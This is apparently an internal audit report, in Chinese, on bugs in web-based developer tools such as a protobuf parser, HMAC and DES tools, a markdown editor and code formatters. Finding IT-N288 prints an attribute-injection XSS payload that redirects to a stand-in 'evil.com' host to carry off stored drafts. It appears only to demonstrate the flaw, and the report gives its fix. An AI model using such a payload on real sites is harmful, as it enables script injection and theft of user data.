- 证据：`tools/it/protobuf-parser.html:404-417`（`:407-414` 只算 depth，`:415` 输出"✅ .proto 语法正确"）、对比 `:278-393` 真正解析逻辑。
- 复现：输入 `message X { int a }`（缺 `=` 与编号）→ 实际 `✅ .proto 语法正确 / Tokens: 9 / 括号平衡`；输入 `not proto at all` → 同样通过；期望报"字段缺少 = 或 ;"。
- 影响：用户误以为文件合法，掩盖真实语法错误，比不校验更危险。
- 方案：校验直接复用 `parseProto()` 的成功/异常路径（try 内成功才报 ✅），抛错时带 token 序号或行号。
**留存建议（tools/it/protobuf-parser.html）**：删除括号计数实现，别维护两套语法判断。

### IT-N278 页面宣称解析"二进制编码结构"，实现只做 .proto 文本转 JSON（中，确认缺陷）
- 问题：`formula-desc` 写"解析 Protocol Buffers 的二进制编码结构"，深度解析两条都写"按 .proto 解析二进制消息/抓包排查 gRPC"，但代码只 `tokenizeProto` 文本并 `JSON.stringify` 结构，没有 varint、字段号、wire type、长度前缀的任何解码。标题"Protobuf 解析器"也易被理解为二进制解析。
- 证据：`tools/it/protobuf-parser.html:161`（二进制结构）、`:204-205`（解析二进制消息/抓包）、`:278-281`（只读 `#input` 文本）、`:391`（输出 JSON 结构）。
- 复现：输入一段真实 wire bytes（如 `08 96 01`）→ 实际 `❌ 期望 {` 或空结构；期望得到 `field 1 varint = 150`。
- 影响：按"抓包排查 gRPC"来的用户完全用不了；标题与 meta（`:12` 写"解析 .proto 文件为 JSON"）又自相矛盾。
- 方案：二选一——把文案统一改为".proto → JSON 结构解析"并改标题为"Proto 结构解析器"；或真正实现 wire format 解码（varint/zigzag/fixed/length-delimited + 字段号树）。
**留存建议（tools/it/protobuf-parser.html）**：本批最大口径偏差，先统一命名与文案，再决定是否做二进制。

### IT-N279 历史/数据表/图表取到静态"算法说明"卡片，记录恒定、图表恒空（中，确认缺陷）
- 问题：`ResText` 用 `document.querySelector('.result-box')` 取到页面第一个 `.result-box`——`:184` 的算法说明卡，而非 `#results` 的结果卡。该文本永不变，历史只记一条后因 `last` 相同不再新增；图表 `parseFloat('HMAC (Hash-based…')` → `NaN`，永不渲染。
- 证据：`tools/it/hmac-generator.html:184`（首个 `result-box` 是说明卡）、`:187`（真正的 `#results` 容器）、`:340-347`（querySelector 选择器）、`:305`（`previousElementSibling` 复制逻辑，仅供对照）。
- 复现：以 `secret-key` 对 `hello`、`world` 各算一次 → 历史仍只有一条，内容是 `HMAC (Hash-based Message Authentication Code) 用于验证消息完整性和真实性。 公式：HMAC(K, m) = …`；数据表只有这一行；图表空白。期望每条记录含 key/msg 与四档摘要。
- 影响：三个辅助 tab 全部失效，无法比对两次签名。
- 方案：`ResText` 改为读 `#results` 的第一个 `.hmac-card .val`（或拼接四档），历史摘要存 `{algo: hex}`；图表不要对摘要做 `parseFloat`。
**留存建议（tools/it/hmac-generator.html）**：选择器改成 `#results` 即可，别再依赖页面首个 `.result-box`。

### IT-N280 密钥只能按 UTF-8 文本处理，无法按 hex/Base64 解释（中，确认缺陷）
- 问题：`getKeyBytes` 直接 `new TextEncoder().encode(key)`，把 `0x0b0b…`、Base64 `a2V5` 都当普通字面量；页面 FAQ 却把"编码不一致（hex vs Base64）"列为签名对不上的三大原因之一，工具本身没有任何编码选项。
- 证据：`tools/it/hmac-generator.html:263-264`（TextEncoder）、`:219`（FAQ 编码原因）、`:151`（输出长度说明，未涉及输入编码）。
- 复现：后端密钥为 16 字节 `0x0b0b…`，输入 `0b0b0b0b0b0b0b0b0b0b0b0b0b0b0b0b` → 实际按 32 个 ASCII 字符计算，HMAC 与后端不符；输入 Base64 `a2V5` → 按 4 字符 `a2V5` 计算；期望按字节解码。
- 影响：对接 Webhook/API 签名时结果永远对不上，且页面给出的排查建议无法执行。
- 方案：密钥区加"文本 / hex / Base64"选择，hex/base64 走 `Uint8Array`；输出同时给 hex 与 Base64 两种格式。
**留存建议（tools/it/hmac-generator.html）**：加编码选择器比补文档更有效，顺带补 Base64 输出。

### IT-N281 "默认参数"预设只改 key，不重算，复制的是旧卡片（低，确认缺陷）
- 问题：预设 `after` 回调是 `copyAll()`，而 `copyAll` 只读现有 `.hmac-card` 并复制；`key` 输入没有 `oninput`，`setValue` 派发的 `input` 不会触发 `calc`。点击"默认参数"后卡片仍是上一次的摘要，toast 还说"已复制全部 HMAC"。
- 证据：`tools/it/hmac-generator.html:167`（key 无 oninput）、`:425`（默认参数只设 key）、`:428`（after=copyAll）、`:430-432`（预设后包装 copyAll 触发 extras）。
- 复现：先算 `hello`/`secret-key`，再点"默认参数"（key 变 `secret-key`）→ 卡片摘要不变（仍是旧 key 的结果），剪贴板也是旧值；期望立即按新 key 重算。
- 影响：预设给出并复制过期签名，属"看起来成功、实际错误"。
- 方案：`after` 改为 `calc()`（async 可 `void calc()`），预设内不要复制；`key` 加 `oninput="calc()"` 或 debounce。
**留存建议（tools/it/hmac-generator.html）**：预设回调一律指向计算函数，不要指向复制函数。

### IT-N282 编码丢弃所有非字母（含数字/标点/重音字母），与"非字母原样保留"相反（中，确认缺陷）
- 问题：`enc` 的 map 对非 `A-Z` 一律 `return ''` 并 `filter` 掉，数字、标点、空格内标点、`é` 等全部消失；整词都是非字母时产生空词，`join(wordSep)` 后留下多余分隔符。
- 证据：`tools/it/a1z26-cipher.html:147`（"非字母字符原样保留"）、`:259-262`（非字母返回空串并过滤）、`:264`（空词仍参与 join）。
- 复现（node 同逻辑）：`hello 42!` → `8-5-12-12-15/`（尾随 `/`，`42!` 成空词）；`café` → `3-1-6`（`É` 被丢）；期望保留 `42!` 或至少提示"已忽略 4 个非字母字符"。
- 影响：原文不可逆（数字/标点永久丢失），且输出出现 `//` 之类异常分隔，接收方无法判断是数据还是空词。
- 方案：非字母原样写入并保留词边界；或过滤空词后统计"忽略数"并 toast/结果区提示；如需支持重音字母，先 `normalize('NFD')` 去组合符。
**留存建议（tools/it/a1z26-cipher.html）**：与 N283 一起改口径，别再"文档说保留、代码全丢"。

### IT-N283 解码对越界数字静默跳过，与"超出 1–26 视为非法输入"不符（中，确认缺陷）
- 问题：`dec` 只在 `v>=1 && v<=26` 时输出字母，其余既不入结果也不报错；`parseInt` 还会把 `12a`、`1e2` 截成合法数字。
- 证据：`tools/it/a1z26-cipher.html:149`（非法输入声明）、`:274-279`（越界静默跳过、`parseInt` 无整串校验）。
- 复现（node 同逻辑）：`1-99-2` → 实际 `AB`；`12a-3` → 实际 `LC`；期望报"99 超出 1–26"或输出 `A?B` 标出非法项。
- 影响：错误输入得到看似正常的结果，用户无法发现数据损坏；与页面自己的解码说明冲突。
- 方案：先按 `/^\d+$/` 校验每个 token，越界或非纯数字时抛错并在结果中定位（如 `第 2 项 99 非法`）。
**留存建议（tools/it/a1z26-cipher.html）**：解码入口加一次 token 校验，成本很低。

### IT-N284 历史/数据表/图表读 textarea 的 textContent（恒空），三个 tab 永远无数据（中，确认缺陷）
- 问题：输出是 `<textarea id="output">`，代码写 `.value`，但 `ResText` 读 `.textContent`——textarea 的 textContent 是初始子节点（空），因此摘要恒 `''`，`history.record` 直接 return；图表也没有数据。
- 证据：`tools/it/a1z26-cipher.html:183`（`textarea#output`）、`:323-329`（读 `r.textContent`）、`:264`/`:283`（写的是 `.value`）。
- 复现：编码 `hello` 后 → 历史 0 条、数据表 0 行、图表空白；期望至少记录输入与输出摘要。
- 影响：历史/对比/趋势全部不可用（与本批 N246/N262/N272/N279 同类问题）。
- 方案：`ResText` 改用 `r.value`；图表若要数值，另存字符数/词数。
**留存建议（tools/it/a1z26-cipher.html）**：`textContent`→`value` 一行修复，顺带检查同模板其它页。

### IT-N285 首尾字母取原始 token（含标点），带标点的词输出乱码（中，确认缺陷）
- 问题：`numeronym` 用 `w[0]` / `w[w.length-1]` 而不是去掉非字母后的 `alpha` 首尾；`internationalization,` 的尾字符是逗号，`(internationalization)` 的首尾是括号。
- 证据：`tools/it/numeronym-generator.html:260-264`（`:262` 用 `alpha.length` 判长、`:263` 却取 `w[0]/w[len-1]`）。
- 复现（node 同逻辑）：`internationalization,` → `i18,`；`internationalization.` → `i18.`；`(internationalization)` → `(18)`；期望均为 `i18n`。
- 影响：整段文本里带标点的词（句末、括号、引号）全部输出错误，且"复制结果"会把乱码带出去。
- 方案：`return alpha[0] + (alpha.length-2) + alpha[alpha.length-1]`，并保留原词前后的标点（如 `i18n,`）。
**留存建议（tools/it/numeronym-generator.html）**：一行改 `alpha` 首尾即可覆盖 90% 场景。

### IT-N286 对所有 ≥3 字母词都缩写，无 7 字母阈值，整段散文变得不可读（中，确认缺陷）
- 问题：文档口径"通常 7 字母以上才用"，实现只要字母数 >2 就缩写；`the`→`t1e`、`cat`→`c1t`，整段普通英文被改成缩写串，且没有最小长度选项。
- 证据：`tools/it/numeronym-generator.html:262`（`alpha.length<=2` 才豁免）、`:193`（"通常 7 字母以上才用"）、`:124`（示例输入为长词，掩盖了短词问题）。
- 复现（node 同逻辑）：`the quick brown fox` → `t1e q3k b3n f1x`；期望短词原样保留（`the quick brown fox`）。
- 影响：段落级转换结果不可用，用户需手工挑词；与页面自述阈值矛盾。
- 方案：加"最小字母数"输入（默认 7），`alpha.length < min` 原样返回；或提供"仅转换已知长词"模式。
**留存建议（tools/it/numeronym-generator.html）**：默认 7 与文档对齐，示例补一条短词对照。

### IT-N287 "复制结果"复制的是逐词对照，不是展示结果；空结果 toast 为 undefined（低，确认缺陷）
- 问题：大号展示区 `#outBig` 是最终缩写串，`#output` 是逐词对照表；`copyOut` 复制 `#output`。空值时 `i18nText()` 未传参，`i18nText` 返回 `undefined`，`showToast(undefined)` 会显示空/`undefined` 文案。
- 证据：`tools/it/numeronym-generator.html:127`（`#outBig` 结果）、`:128`（`#output` 对照）、`:272-277`（分别写入）、`:131`（按钮文案"复制结果"）、`:259`（`i18nText()` 无参）。
- 复现：输入 `internationalization` → 点"复制结果"→ 粘贴得到 `internationalization → i18n`；期望 `i18n`。清空后点复制 → toast 内容为空/undefined。
- 影响：复制内容与所见不一致，用户易把对照表贴进文档。
- 方案：复制 `#outBig.textContent`（为空时提示"请输入文本"），并给 `i18nText` 传具体 key 或 fallback 字符串。
**留存建议（tools/it/numeronym-generator.html）**：复制源切到 `#outBig`，与页面主展示一致。

### IT-N288 预览/导出存在属性注入型 XSS（图片 alt、链接 URL 未转义）（高，确认缺陷）
- 问题：解析器只转义 `<`/`>`/`&`，随后用模板拼 `<img src="$2" alt="$1">`、`<a href="$2" …>`；URL 与 alt 中的 `"` 未转义，可直接闭合属性并注入事件处理器。文档自己写着"必须过滤内嵌 HTML，防止 XSS"，但没有任何净化。
- 证据：`tools/it/markdown-editor.html:759`（图片拼接）、`:762`（链接拼接）、`:710-712`（只转义三个字符）、`:527`（安全声明）、`:938`（`preview.innerHTML=html`）。
- 复现（node 照抄两条正则）：输入 `![a" onerror="location.href='//evil.com'](x)` → 实际输出 `<img src="x" alt="a" onerror="location.href='//evil.com'">`；预览加载即执行 `location.href`，可外带 `localStorage['toolbox_md_draft']` 中的草稿。期望输出实体化后的 `alt="a&quot; onerror=…"` 纯文本。
- 影响：粘贴不可信 Markdown（README/Issue/聊天记录）即可执行任意 JS；导出 .html 后同样带毒。
- 方案：属性值统一走 `escAttr`（`"`→`&quot;`、`'`→`&#39;`），URL 做协议白名单（仅 http/https/mailto，禁 `javascript:`/`data:`），并本地引入 DOMPurify 做最后一道白名单净化。
**留存建议（tools/it/markdown-editor.html）**：XSS 是本页最高优先，先补 `escAttr`+协议白名单，再谈语法扩展。

### IT-N289 预设"任务清单"的 `- [x]` 不渲染复选框，原样当文本输出（中，确认缺陷）
- 问题：列表解析只识别 `^[-*+]\s+` 并整段塞进 `<li>`，不处理 GFM task list 的 `[ ]`/`[x]`；预设却把"任务清单"当卖点，渲染结果是字面量 `[x]`。
- 证据：`tools/it/markdown-editor.html:582`（预设内容 `- [x] 编写文档`）、`:888-905`（`parseLists` 无 task list 分支）、`:521`（解析顺序说明也未提任务列表）。
- 复现：点"任务清单"预设 → 预览实际 `<li>[x] 编写文档</li>`（纯文本）；期望 `<li><input type="checkbox" checked disabled> 编写文档</li>`。
- 影响：预设承诺的语法不支持，用户以为勾选状态会保留。
- 方案：`parseLists` 对 item 前缀 `^\[([ xX])\]\s+` 生成 disabled checkbox；或在预设文案标注"任务清单仅作纯文本"。
**留存建议（tools/it/markdown-editor.html）**：要么实现 task list，要么删该预设，别留半承诺。

### IT-N290 `#` 与 `##` 都渲染成 h2，预览与导出都没有 h1（低，确认缺陷）
- 问题：`^#\s+` 被映射为 `<h2>`，与 `^##\s+` 相同，文档级一级标题在预览/导出 HTML 中不存在；这与 CommonMark 的 h1 语义不符，导出到别处层级整体下移。
- 证据：`tools/it/markdown-editor.html:735-736`（两条都输出 `<h2>`）、`:521`（公式里明确写"# 与 ## 均输出 h2"，属有意为之）、`:203`（CSS 备了 h1 样式却用不到）。
- 复现：输入 `# 标题` → 预览 `<h2>标题</h2>`；期望 `<h1>标题</h1>`。
- 影响：复制到 GitHub/博客后大纲层级错误；页面 h1 样式成为死代码。
- 方案：`#` 映射 h1（预览容器内无冲突），保留 `##`→h2；同步改 `:521` 文案。
**留存建议（tools/it/markdown-editor.html）**：改一行正则 + 改一句说明即可。

### IT-N291 clamp 表达式算错：最小视口得到"首选字号"，大范围还会提前封顶（高，确认缺陷）
- 问题：斜率用 `(pref-min)/(vwMin/100)` 与 `(max-min)/(vwMax/100)` 取 `max`，截距用 `pref - vw*vwMin/100`——等于把直线锚在 `(vwMin, pref)`，最小视口永远输出 `pref` 而非 `min`；当 `pref` 接近 `min` 时斜率取 `slope2` 也不对。正确应为 `(max-min)/(vwMax-vwMin)*100`、`min - slope*vwMin/100`。
- 证据：`tools/it/clamp-calculator.html:275-279`（斜率/截距/表达式）、`:288-294`（预览另走 `min+(max-min)*t`）。
- 复现（node 照抄）：默认 16/24/48 @375–1440 → 实际 `clamp(16px, 2.22vw + 15.67px, 48px)`，375px 得 **24px**（期望 16）、1440 得 47.67；16/20/24 @375–1440 → `1.07vw + 16px`，375=20、约 750px 即触顶 24，全程不出现 16。正确式应为 `clamp(16px, 3vw + 4.73px, 48px)`（375=16、1440=48）。
- 影响：复制到站点的字号在小屏偏大、大屏提前封顶，完全不是用户设定的 min→max 区间。
- 方案：改用正确斜率/截距，并校验 `min ≤ pref ≤ max`；`pref` 仅在需要"中点偏好"时按分段函数使用，不能当直线锚点。
**留存建议（tools/it/clamp-calculator.html）**：本页核心公式错误，优先修 `:275-278`。

### IT-N292 滑块预览完全忽略"首选字号"，与生成表达式不一致（中，确认缺陷）
- 问题：`slide` 用 `min+(max-min)*t` 线性插值，`pref` 输入不参与；而表达式按 `pref` 锚定。用户拖动滑块看到的是"正确"的 min→max，复制出去却是另一条线；改 `pref` 时预览毫无变化。
- 证据：`tools/it/clamp-calculator.html:285-294`（预览只读 min/max/vwMin/vwMax）、`:169`（文档示例"16–24 @320–1280"）、`:269-273`（pref 参与表达式）。
- 复现：默认参数下把滑块拖到 375 → 预览显示 16px，但同点表达式算出 24px；把 pref 从 24 改到 40 再拖滑块 → 预览数值完全不变。
- 影响：用户无法用预览验证表达式，"首选字号"控件形同虚设。
- 方案：预览按生成表达式计算（`clamp(min, vw*w/100+rem, max)`），或明确把 `pref` 定义为中点并统一两套算法。
**留存建议（tools/it/clamp-calculator.html）**：预览与表达式必须共用同一函数，避免二次实现。

### IT-N293 只校验视口大小关系，不校验 min/max，倒置时表达式恒等于 MIN（中，确认缺陷）
- 问题：仅 `vwMin>=vwMax` 报错；`min>max` 或 `pref` 越界不拦。生成 `clamp(48px, …, 16px)` 时按 CSS 定义 `max(MIN, min(V, MAX))` 恒返回 48px，表达式彻底失效。
- 证据：`tools/it/clamp-calculator.html:269-274`（解析与唯一校验）、`:279`（直接拼 `clamp(min,…,max)`）、`:301`（初始化即 `calc()`）。
- 复现：输入 min=48、pref=40、max=16、视口 375–1440 → 实际 `clamp(48px, -3.2vw + 60px, 16px)`；任意视口都渲染 48px；期望提示"最小字号必须小于最大字号"。
- 影响：错误参数静默产出无效 CSS，用户排查困难。
- 方案：校验 `min <= pref <= max` 且均为正数，非法时标红输入并中止生成；同时对 `parseFloat(...)||默认值` 的 0 值做显式判空。
**留存建议（tools/it/clamp-calculator.html）**：三条数值校验加在 `calc()` 开头即可。

### 承诺 vs 实际（S 批专项）
- `tools/it/gitignore-generator.html:172`、`:382`：承诺忽略/输出 `.env`，8 个模板 29 条规则中无 `.env`（N270）；`:111` 写"按语言、框架与编辑器选择模板"，实现 `:217-226` 只有 8 个语言/IDE 栈，无任何框架模板；`:344` 的"默认参数"实际全选 8 项（N271）。
- `tools/it/phone-qr.html:201`、`:197`：承诺"使用标准 tel: URI，主流扫码器均支持/扫码唤起拨号"，实际生成随机噪点图、无数据编码与纠错（N273）；`:158` 承诺剥离全部空白，实际仅在补 `tel:` 时剥离（N274）。
- `tools/it/protobuf-parser.html:161`、`:204-205`：承诺解析二进制结构与抓包排查 gRPC，实现只有 `.proto` 文本转 JSON（N278）；`:415` 的"校验"只数括号（N277）；`:290-305` 不支持 `map<...>`（N276）；`:12` 的 meta 口径（.proto→JSON）与正文自相矛盾。
- `tools/it/hmac-generator.html:219`：FAQ 把"编码不一致"列为签名失败主因，实际密钥固定按 UTF-8 文本编码、输出只有 hex（N280）；`:151` 的"输出长度=摘要长度"描述正确，无问题。
- `tools/it/a1z26-cipher.html:147` 承诺非字母原样保留、`:149` 承诺越界视为非法，实际全部丢弃/静默跳过（N282、N283）。
- `tools/it/numeronym-generator.html:397` 承诺"结果展示缩写与各字母间字符数还原"，实际只有 `词 → 缩写` 对照、没有还原功能；`:193` 写"通常 7 字母以上才用"，`:262` 却对所有 ≥3 字母词生效（N286）。
- `tools/it/markdown-editor.html:527` 承诺"必须过滤内嵌 HTML，防止 XSS"，实际无任何净化且存在属性注入（N288）；`:521` 写"# 与 ## 均输出 h2"，与 CommonMark h1 语义不符（N290）；`:582` 的"任务清单"预设不支持 task list（N289）。
- `tools/it/clamp-calculator.html:169` 示例"320–1280px、16–24px：clamp(16px, 1rem+0.625vw, 24px)（约在 320px=16、1280px=24）"——按页面 `:275-278` 同参数实际生成 `clamp(16px, 2.5vw + 16px, 24px)`，320px 得 24px、≥320px 后一直被 max 截断，示例与算法不符（N291）。

### 覆盖
- 实读 8 页：`tools/it/gitignore-generator.html`、`tools/it/phone-qr.html`、`tools/it/protobuf-parser.html`、`tools/it/hmac-generator.html`、`tools/it/a1z26-cipher.html`、`tools/it/numeronym-generator.html`、`tools/it/markdown-editor.html`、`tools/it/clamp-calculator.html`（另读 `js/tool-kit.js` 的 `setValue`/`preset.bar`、`js/toolbox-stub.js` 的 `i18nText` 兜底）。
- 新增 24 条（高 6 / 中 15 / 低 3），编号 IT-N270~IT-N293；上一批止于 IT-N269，本批无重号。
- 未覆盖说明：只审计主流程、边界与文档口径，未穷举全部输入组合（gitignore 只核对模板全集与预设赋值，未逐栈检查每条规则是否过时；phone-qr 未实扫，结论为"无数据编码/纠错块"的构造性判定；protobuf 只测 map、非法文本、负数枚举与二进制输入，未覆盖 `extend`/`group`/aggregate option；hmac 未在非安全上下文实测 `crypto.subtle` 缺失路径；a1z26 只测大小写、重音、标点、数字与越界；numeronym 只测标点位置、短词与已有数字缩写；markdown 只做属性注入与 task list/# 层级；clamp 只算 3 组参数）。
- 未做验证：未改代码、未构建、未跑门禁、未 git 写、未开浏览器；结论为源码静态分析 + `node` 内存复算（临时脚本 `/tmp/t1.js`、`/tmp/t2.js`、`/tmp/t3.js`，未落仓库）；未验证英文态 `?lang=en-US`、繁体与移动端。

### IT-N294 DES 密钥编排只读取密钥最后 1 个字节，56 位密钥退化为 8 位（高，确认缺陷）
- 问题：`desCreateSubkeys` 把 8 字节密钥按 `keyBytes[i*8+j]`（i、j 各 0–7）装进 8 个 32 位字，索引 8–63 全为 undefined；又因 `(v<<8)` 是 32 位运算，`k[0]` 最终只剩 key[4..7]，`k[1..7]` 恒 undefined，PC1 取位几乎全部落到 0。
- 证据：`tools/it/des.html:336`（`v=(v<<8)|keyBytes[i*8+j]`）、`:338`（`bit=k[Math.floor((PC1[i]-1)/8)]` → 只用到 k[0]）、`:327`（`hexToBytes`）。
- 复现（node 照抄 `:335-338` 并调用 `desEcb`）：密钥 `0123456789abcdef` 加密 `4e6f772069732074` → `ffcfffff30f3ccff`；把密钥第 0–6 字节逐个异或 0x11，密文全部不变；仅第 7 字节改动才变为 `c3c33ccfcffc3cf3`。标准 DES 向量应为 `3fa40e8a984d4815`。
- 影响：有效密钥空间至多 2^8，页面 :157/:166 宣称的 56/112/168 位安全形同虚设；输出与任何标准 DES/3DES 实现不兼容，:263 "解密老系统历史数据"场景不可用。
- 方案：改为按字节逐位取 PC1（`(keyBytes[(PC1[i]-1)>>3] >> (7-((PC1[i]-1)&7))) & 1`），取消 32 位打包；3DES 分别对 k1/k2/k3 调同一函数。
**留存建议（tools/it/des.html）**：重写 `:334-352` 的密钥编排，并用 FIPS 已知向量做回归。

### IT-N295 64 位分组在 32 位整数上拼装，FP 置换丢高位、自解密不还原（高，确认缺陷）
- 问题：`desBlock` 用 `(R<<32)|L>>>0` 组装 64 位状态，JS 移位按模 32 计，`R<<32` 等于 `R<<0`，结果退化为 `R|L` 的 32 位按位或；FP 再以 `>>> (63-fp)` 取位，同样在 0–31 循环，高 32 位信息不可恢复。
- 证据：`tools/it/des.html:378`、`:380`、`:356-359`（L/R 始终是 32 位整数）。
- 复现（node 实算）：R=0x12345678、L=0x9abcdef0 → 实际 `9abcdef8`，期望 `123456789abcdef0`；按页面默认参数（3DES-CBC、48hex 密钥、零 IV、PKCS7）加密再解密，`Hello, DES/3DES encryption!` 往返输出乱码（FAIL）。
- 影响：即使修好密钥编排，加解密也不可逆且与标准实现不兼容，核心功能失效。
- 方案：用 Uint8Array 逐位操作或 BigInt 承载 64 位状态，按 IP→16 轮→FP 的规范顺序重写。
**留存建议（tools/it/des.html）**：`:354-382` 整段重写，单测覆盖"加密→解密"与已知向量。

### IT-N296 密钥/IV/密文的非法输入全部静默"纠正"，用户无感知（中，确认缺陷）
- 问题：非十六进制密钥经 `parseInt` 得 NaN、写入 Uint8Array 变 0；密钥短补零、长截断均无提示；非法或不足 8 字节的 IV 一律回退全零；解密时"全 hex 且偶数长度才算 hex"，奇数 hex 转 Base64 抛 `InvalidCharacterError`，密文长度也不校验是否为 8 的倍数。
- 证据：`:439`（hex 密钥解析）、`:442-448`（补零/截断）、`:455-457`（IV 回退全零）、`:327`（`new Uint8Array(h.length/2)`，实测 `abc` → 0xab）、`:534`（解密输入判定）、`:535`（hex/Base64 判定正则）、`:387-390`（按 8 字节循环、不校验 `data.length%8`）。
- 复现（node）：key=`password` 且不勾"密钥为文本" → 实际密钥全 0；IV=`abc` → 全零 IV；密文 `abc` → "处理失败: InvalidCharacterError"；4 字节 hex 密文 → 静默按 8 字节块处理并输出乱码。
- 影响：错误配置被静默接受，用户看到"成功"提示却拿到错误结果；密钥/IV 补零进一步削弱本已失效的安全性。
- 方案：严格校验 key/IV 的字符集与长度，非法时标红并中止；解密校验密文长度为 8 的倍数，奇数 hex 给出明确错误而非转 Base64。
**留存建议（tools/it/des.html）**：`:431-457` 与 `:532-536` 加显式校验与错误提示。

### IT-N297 JS 格式化在表达式中插入换行/注释，触发 ASI 改变语义或直接语法错误（高，确认缺陷）
- 问题：`formatJs` 丢弃全部原始空白，遇注释强制换行；`const x = 1/*c*/+2` 被拆成 `const x =1\n/*c*/\n+2 …`，`+2` 成为新语句开头；`return\n{a:1}` 的 ASI 语义被合并成 `return {`。
- 证据：`tools/it/js-formatter.html:355`（`newline()` 去行尾空白）、`:359-364`（注释先换行再原样输出）、`:418`（统一收尾）。
- 复现（node 实跑格式化结果并执行）：`const x = 1/*c*/+2\nconsole.log(x)` → 原文结果 3；格式化后 `const x =1\n/*c*/\n+2 console.log(x)` → `SyntaxError: Unexpected identifier 'console'`。`function f(){\nreturn\n{a:1}\n}` → 原文返回 undefined，格式化后返回 `[object Object]`。
- 影响：页面 :225 "纯格式化不会改变代码行为"不成立；粘贴正常代码可能得到不可运行或行为变化的输出。
- 方案：注释保持原 token 位置（仅在原换行处换行）；对 `return/throw/break/continue` 的 ASI 边界强制保留换行或加分号；或改用成熟格式化库。
**留存建议（tools/it/js-formatter.html）**：`:343-421` 的换行策略需重做，不能"注释即换行"。

### IT-N298 压缩不补分号、不保留换行，多语句代码基本必然非法（高，确认缺陷）
- 问题：`minifyJs` 仅按 token 类型决定是否加一个空格，从不插入 `;`；删掉全部换行后 ASI 边界消失，`i++` 后紧跟下一语句时还因 `:436` 主动取消空格。
- 证据：`:429-443`（主循环无分号逻辑）、`:436`（`prevVal==='++'` 时 `needSpace=false`）、`:431`（`tk.v==='regex'` 恒不成立，应为 `tk.t`）。
- 复现（node 实跑并执行）：`let i=0\ni++\nj=1` → `let i=0 i++j=1`（`SyntaxError`）；`const a=1 // hi\nconst b=2` → `const a=1 const b=2`（`SyntaxError`）；`x=5\n[1,2].map(...)` → `x=5[1,2].map(...)`（`SyntaxError`）。
- 影响：压缩按钮对绝大多数多语句脚本产出的都是不可运行代码，且没有任何告警。
- 方案：保留语句间分号/必要换行；修正 regex 类型判断；压缩后用 `new Function` 自检并在失败时提示。
**留存建议（tools/it/js-formatter.html）**：`:422-446` 需补语句分隔，`:431` 一行修正。

### IT-N299 "校验"只统计括号数量，不检测语法（中，确认缺陷）
- 问题：`doValidate` 只统计 `{ } ( ) [ ]` 数量与 `function`/`const` 出现次数；括号总数相等但结构错乱、非法声明、缺操作数都会显示"✅ 校验通过"。
- 证据：`:449-474`（`:456-458` 计数、`:470-473` 仅比较总数）；`:460-468` 输出为统计信息而非语法诊断。
- 复现：输入 `const 1 = 2; for(` → `(` 计数 1/1，页面输出"✅ 校验通过"；期望报语法错误。
- 影响：用户把"校验通过"当成可运行保证，实际只是计数器。
- 方案：用 `new Function(src)` 捕获 SyntaxError 并给出行列，或接入纯前端解析器；按钮文案改为"统计"。
**留存建议（tools/it/js-formatter.html）**：`:449-475` 改成真实语法检查，最低限度也改文案。

### IT-N300 Python 缩进重排错误：块体被提前 dedent，三引号行不缩进，自带样例格式化即坏（高，确认缺陷）
- 问题：dedent 依赖 `stack._allowDedent`，该标志只在冒号行置 true，且下一行受 `!(stack[top]===1 && /^[a-zA-Z]/…)`（`_defStarted` 从未赋值）阻挡；嵌套块首行反而被 pop 一级；三引号行直接 `out.push(line)` 保留源缩进；顶层语句以字母开头时无法回到 0。
- 证据：`:303-305`（三引号原样输出）、`:317-320`（dedent 条件与 `_allowDedent`）、`:319-329`（缩进计算与入栈）。
- 复现（node 实跑页面自带 SAMPLE，indent=4）：`def fibonacci(n):` 之后 `"""…"""`、`a, b = 0, 1` 都在第 0 列；`for` 体缩进 4、`return result` 缩进 4；`class Calculator:` 与 `def __init__` 都缩进 4，`if __name__` 也缩进 4。小例 `def f():\n    if x:\n        y=1\n    z=2\nw=3` → `y=1` 只缩进 2、`z=2`/`w=3` 全部缩进 2（期望 4/2/0）。两种输出都是 IndentationError。
- 影响：美化后的代码不可运行，示例按钮直接给出坏结果。
- 方案：用统一的缩进栈按真实块结构缩进（记录每行层级与块是否结束），三引号/注释行按当前层级补缩进；或接入浏览器内 Python 解析器。
**留存建议（tools/it/python-formatter.html）**：`:291-335` 缩进算法重写，SAMPLE 应作为回归用例。

### IT-N301 Python 压缩丢弃全部缩进、把注释与后续代码拼成一行，含块结构必坏（高，确认缺陷）
- 问题：`minifyPython` 对每行 `trim()` 后按 `; ` 拼接，从不保留缩进；注释行同样进入 `out`，下一行代码会被拼到注释后面，整行变成注释。
- 证据：`:350-360`（`trim()` 与拼接判据）、`:353`（注释行 push）、`:356-357`（`out[last]=prev+'; '+trimmed`）。
- 复现（node 实跑）：`# comment\nx = 1\nprint(x)` → `# comment; x = 1; print(x)`（赋值被注释吞掉）；`def f():\n    x=1\n    return x\nprint(f())` → `def f():\nx=1; return x; print(f())`（缩进丢失、`print` 被并入函数，`x=1` 在第 0 列直接 IndentationError）。
- 影响："压缩"产物既不可运行也改变语义，与 :165 "格式化只改变排版"相反。
- 方案：压缩保留块缩进与换行（逐物理行输出），注释行单独成行且不与代码合并；或明确标注"仅演示、不保证可执行"。
**留存建议（tools/it/python-formatter.html）**：`:336-365` 不能用"整行 trim + 分号拼接"实现。

### IT-N302 Python "校验"只检查三引号闭合，缩进错误也显示通过（中，确认缺陷）
- 问题：`doValidate` 仅统计行数/def/class/import 与三引号是否闭合；`:387-389` 的 depth 只做加减不参与判定，缩进错误、`if` 缺冒号、`def f():\nprint(1)` 都报"✅ 校验通过"。
- 证据：`:368-401`（`:387-389` 深度计算、`:399-400` 仅判三引号）。
- 复现：输入 `def f():\nprint(1)`（缺 4 空格）→ 输出"三引号字符串未闭合: 否 ✅"与"✅ 校验通过"；期望提示缩进错误。
- 影响：误导用户，校验按钮形同装饰。
- 方案：接入纯前端 Python 解析器做真实语法检查，或至少检测"冒号行后必须增加缩进""return 必须在块内"等结构规则并标明能力边界。
**留存建议（tools/it/python-formatter.html）**：`:368-402` 与 JS 页 `:449-475` 同属"假校验"，建议统一换真实解析。

### IT-N303 CSV 输出被覆盖成只剩 `</tbody></table>`，HTML 代码与预览全部失效（历史记录，2026-11-06 当前基线复核不再复现）
- 基线 `0781ef7e61`：当前第 315 行为 `h += '  </tbody>\n</table>'`；独立 Chrome 实测生成完整 table、表头和单元格。原问题为历史发现，当前版本不可再作为未修复缺陷派发。
- 问题：`calcTool` 拼好完整表格字符串后，`:314` 又执行 `var h= header?'  </tbody>\n</table>':'  </tbody>\n</table>';`（两个分支完全相同），把 `h` 覆盖为闭合片段，`:315` 写入输出、`:316` 写入预览。
